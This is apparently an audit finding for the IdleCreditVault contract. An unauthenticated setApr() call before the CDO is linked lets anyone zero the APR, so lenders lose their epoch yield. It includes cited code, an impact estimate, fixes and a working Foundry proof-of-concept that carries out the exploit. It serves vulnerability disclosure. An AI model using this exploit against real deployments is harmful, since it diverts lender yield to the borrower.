### Title
Unauthenticated APR overwrite before CDO linking lets an attacker eliminate borrower yield - (`contracts/strategies/idle/IdleCreditVault.sol`)

### Summary
`IdleCreditVault.setApr()` accepts calls from any address while `idleCDO == address(0)`. A newly initialized strategy therefore has an unauthenticated configuration window before `setWhitelistedCDO()` links it to the CDO. An attacker can set `lastApr` to zero during that window. When the honest CDO proxy is initialized afterward, `_additionalInit()` reads the poisoned APR and calls `setAprsWithBuffer()`, permanently setting both `lastApr` and `unscaledApr` to zero for the epoch configuration.

### Finding Description
The access-control guard in `setApr()` is conditional on `idleCDO` already being configured:

```solidity
// contracts/strategies/idle/IdleCreditVault.sol:225
function setApr(uint256 _apr) public {
  address _cdo = idleCDO;

  // if cdo is not yet set we skip the check (this can happen only during the setup)
  if (_cdo != address(0)) {
    if (msg.sender != _cdo && msg.sender != manager) revert NotAllowed();
  }
  ...
  lastApr = _apr;
}
``` [1](#0-0) 

Initialization stores the configured APR but does not initialize `idleCDO`. [2](#0-1) 

A separate transaction can therefore execute:

1. Owner initializes the `IdleCreditVault` proxy with a nonzero APR.
2. Attacker calls `strategy.setApr(0)` while `strategy.idleCDO() == address(0)`.
3. Owner initializes `IdleCDOEpochVariant` with the strategy.
4. `IdleCDOEpochVariant._additionalInit()` reads `getApr()`, which returns the attacker-controlled `lastApr`, and calls `_setScaledApr(0)`. [3](#0-2) 
5. `setAprsWithBuffer(0, ...)` updates `unscaledApr` as well as `lastApr`. [4](#0-3) 

This bypasses the intended invariant that only the linked CDO or manager can alter APR. [5](#0-4) 

### Impact Explanation
A zero APR causes `_calcInterest()` and therefore `expectedEpochInterest` to exclude ordinary borrower interest. [6](#0-5) [7](#0-6) 

At `stopEpoch(0, 0)`, the CDO requests only pending withdrawal funding from the borrower and receives no epoch yield. The borrower retains all credit yield that should have accrued to lenders. For principal `P` and intended APR `r`, the unpaid epoch interest is approximately:

```text
loss = P * r * epochDuration / YEAR
```

For example, with 10,000,000 underlying tokens, a 10% APR, and a 30-day epoch, roughly 82,191 tokens of expected lender yield are never demanded by the vault. This is theft or permanent loss of unclaimed yield caused by an unauthenticated configuration write.

### Likelihood Explanation
The exploit requires a strategy proxy to remain initialized but not yet linked to its CDO. That state exists whenever deployment is split across transactions or when a strategy is prepared before its CDO proxy is deployed. The attacker needs no role, capital, KYC status, or timing control beyond submitting `setApr(0)` before the first transaction that sets `idleCDO`. After the CDO is linked, the same call correctly reverts, so the vulnerability window is limited to deployment/configuration but has a direct accounting consequence once missed.

### Recommendation
Remove the unauthenticated setup path from `setApr()` and its wrappers. Options include:

- Require `msg.sender == owner()` or `msg.sender == manager` while `idleCDO == address(0)`, and only allow the linked CDO afterward.
- Set `idleCDO` during `initialize()` and enforce `msg.sender == idleCDO || msg.sender == manager` unconditionally.
- Make `setAprs()` and `setAprsWithBuffer()` validate the caller before mutating `unscaledApr`; they currently mutate `unscaledApr` before `setApr()` performs the authorization check. [8](#0-7) 

The deployment factory should also initialize the strategy, deploy/link the CDO, and set the intended APR atomically.

### Proof of Concept
The following Foundry test demonstrates the authentication bypass and the resulting zero-interest epoch. Deployment mocks may be replaced with the repository's existing token/proxy helpers.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {TransparentUpgradeableProxy} from
  "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";

import {IdleCreditVault} from
  "../contracts/strategies/idle/IdleCreditVault.sol";
import {IdleCDOEpochVariant} from
  "../contracts/IdleCDOEpochVariant.sol";
import {MockERC20} from "./mocks/MockERC20.sol";

contract PreLinkAprBypassTest is Test {
  address owner = address(this);
  address manager = address(0xA11CE);
  address guardian = address(0xBEEF);
  address governanceFund = address(0xFEE);
  address borrower = address(0xB0B);
  address attacker = address(0xBAD);

  MockERC20 underlying;
  IdleCreditVault strategy;
  IdleCDOEpochVariant cdo;

  function testAttackerZeroesAprBeforeCdoLink() public {
    underlying = new MockERC20("USD Coin", "USDC", 6);

    // Honest strategy initialization with 10% APR.
    IdleCreditVault strategyImpl = new IdleCreditVault();
    strategy = IdleCreditVault(address(new TransparentUpgradeableProxy(
      address(strategyImpl),
      owner,
      abi.encodeWithSelector(
        IdleCreditVault.initialize.selector,
        address(underlying),
        owner,
        manager,
        borrower,
        "Borrower",
        10e18
      )
    )));

    assertEq(strategy.idleCDO(), address(0));
    assertEq(strategy.lastApr(), 10e18);

    // Unprivileged authentication bypass before the CDO is linked.
    vm.prank(attacker);
    strategy.setApr(0);
    assertEq(strategy.lastApr(), 0);

    // Honest CDO initialization consumes the poisoned APR.
    IdleCDOEpochVariant cdoImpl = new IdleCDOEpochVariant();
    cdo = IdleCDOEpochVariant(address(new TransparentUpgradeableProxy(
      address(cdoImpl),
      owner,
      abi.encodeWithSelector(
        IdleCDOEpochVariant.initialize.selector,
        0,
        address(underlying),
        governanceFund,
        guardian,
        address(0),
        address(strategy),
        0
      )
    )));

    // _additionalInit propagated the attacker-controlled APR to unscaledApr.
    assertEq(strategy.lastApr(), 0);
    assertEq(strategy.unscaledApr(), 0);

    strategy.setWhitelistedCDO(address(cdo));

    // Fund an AA lender and start an epoch.
    uint256 principal = 10_000_000e6;
    underlying.mint(address(this), principal);
    underlying.approve(address(cdo), principal);
    cdo.depositAA(principal);

    vm.prank(manager);
    cdo.startEpoch();
    assertEq(underlying.balanceOf(borrower), principal);

    // Epoch completes. Because APR is zero, no borrower repayment is required.
    skip(30 days);
    vm.prank(manager);
    cdo.stopEpoch(0, 0);

    assertEq(strategy.lastApr(), 0);
    assertEq(underlying.balanceOf(address(cdo)), 0);
    assertEq(cdo.lastEpochInterest(), 0);

    // Intended 10% APR would have produced approximately this obligation.
    uint256 missingYield = principal * 10e18 / 100 * 30 days / (365 days * 1e18);
    assertGt(missingYield, 82_000e6);
  }
}
```

The broken invariant is `setApr` authorization. The honest CDO setup converts the attacker’s pre-link write into both `lastApr == 0` and `unscaledApr == 0`, after which `startEpoch()` sends principal to the borrower and `stopEpoch()` demands no epoch interest.

### Citations

**File:** contracts/strategies/idle/IdleCreditVault.sol (L124-158)
```text
  function initialize(
    address _underlyingToken,
    address _owner,
    address _manager,
    address _borrower,
    string memory borrowerName,
    uint256 _apr
  ) public virtual initializer {
    OwnableUpgradeable.__Ownable_init();
    ReentrancyGuardUpgradeable.__ReentrancyGuard_init();
    require(token == address(0), "Token is already initialized");

    //----- // -------//
    token = _underlyingToken;
    underlyingToken = IERC20Detailed(token);
    tokenDecimals = underlyingToken.decimals();
    oneToken = 10**(tokenDecimals);
    borrower = _borrower;
    manager = _manager;
    maxApr = DEFAULT_MAX_APR;
    // on the first setup we set the lastApr equal to the unscaledApr
    lastApr = _apr;
    unscaledApr = _apr;
    defaultRecoveryInitialized = true;

    // name will be like: Pareto Credit Vault Borrower
    // symbol will be like: Borrower
    ERC20Upgradeable.__ERC20_init(
      _concat(string("Pareto Credit Vault "), borrowerName),
      borrowerName
    );
    //------//-------//

    transferOwnership(_owner);
  }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L206-220)
```text
  function setAprs(uint256 _unscaledApr, uint256 _apr) external {
    unscaledApr = _unscaledApr;
    // here we also check that msg.sender is allowed
    setApr(_apr);
  }

  /// @notice set both the unscaled APR and APR scaled by epoch plus buffer duration.
  /// @dev only CDO and manager can set the APR through `setApr`.
  /// @param _unscaledApr unscaled APR
  /// @param _duration epoch duration
  /// @param _buffer buffer duration
  function setAprsWithBuffer(uint256 _unscaledApr, uint256 _duration, uint256 _buffer) external {
    unscaledApr = _unscaledApr;
    setApr(_duration == 0 ? _unscaledApr : _unscaledApr * (_duration + _buffer) / _duration);
  }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L222-234)
```text
  /// @notice set the fixed apr
  /// @dev only cdo and manager can set the apr. If manager manually set apr from 
  /// here it will not be scaled to include the buffer period
  function setApr(uint256 _apr) public {
    address _cdo = idleCDO;

    // if cdo is not yet set we skip the check (this can happen only during the setup)
    if (_cdo != address(0)) {
      if (msg.sender != _cdo && msg.sender != manager) revert NotAllowed();
    }
    uint256 _maxApr = maxApr;
    if (_maxApr != 0 && _apr > _maxApr) revert NotAllowed();
    lastApr = _apr;
```

**File:** contracts/IdleCDOEpochVariant.sol (L67-90)
```text
  function _additionalInit() internal virtual override {
    // all yield to senior
    isAYSActive = false;

    // set epoch params
    epochDuration = 30 days;
    bufferPeriod = 5 days;
    // we set epochEndDate to avoid issues with the first epoch, so we set
    // it to current time minus bufferPeriod so that the first epoch can start right away
    epochEndDate = block.timestamp - 5 days;

    // allow requests for withdrawals
    allowAAWithdrawRequest = true;
    allowBBWithdrawRequest = true;

    // default no instant withdraw allowed
    disableInstantWithdraw = true;

    // by default deposits during an epoch are disabled
    isDepositDuringEpochDisabled = true;

    // scale the apr to include the buffer period
    _setScaledApr(_getStrategyApr());
  }
```

**File:** contracts/IdleCDOEpochVariant.sol (L254-263)
```text
    // calculate expected interest 
    // NOTE: all withdrawal requests, burn tranche tokens and decrease getContractValue,
    // this can be done only prior to the start of the epoch so getContractValue() is the total amount net
    // of all withdrawal requests. We add the fee that we should get for normal pending withdraws
    // we also add/remove the over/under performance caused by withdraw requests.
    // Pending fees remain due even if fixed-APR requests exhaust active interest.
    int256 adjustedActiveInterest = int256(_calcInterest(getContractValue())) + interestForOverUnderPerformance;
    if (adjustedActiveInterest < 0) adjustedActiveInterest = 0;
    expectedEpochInterest = pendingWithdrawFees + uint256(adjustedActiveInterest);
    interestForOverUnderPerformance = 0;
```

**File:** contracts/IdleCDOEpochVariant.sol (L798-808)
```text
  /// @notice Calculate the interest of an epoch for the given amount
  /// @param _amount Amount of underlyings
  function _calcInterest(uint256 _amount) internal view returns (uint256) {
    return _calcInterestWithApr(_amount, _getStrategyApr());
  }

  /// @notice Calculate the interest of an epoch for the given amount and apr
  /// @param _amount Amount of underlyings
  /// @param _apr Apr used for the calculation
  function _calcInterestWithApr(uint256 _amount, uint256 _apr) internal view returns (uint256) {
    return _amount * (_apr / 100) * epochDuration / (365 days * ONE_TRANCHE_TOKEN);
```
